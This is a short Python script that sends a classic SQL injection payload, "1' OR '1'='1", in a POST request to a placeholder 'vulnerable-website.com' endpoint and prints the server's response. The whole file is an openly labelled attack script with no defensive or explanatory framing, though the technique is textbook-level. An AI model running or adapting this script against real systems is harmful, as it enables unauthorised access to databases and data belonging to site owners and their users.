import requests

# Simulate SQL injection attack on a vulnerable web interface
def perform_sql_injection_attack(url, payload):
    response = requests.post(url, data={'query': payload})
    print(f"SQL Injection attack completed. Response: {response.text}")

# Example payload for SQL Injection
sql_injection_payload = "1' OR '1'='1"

perform_sql_injection_attack("http://vulnerable-website.com/sql_endpoint", sql_injection_payload)
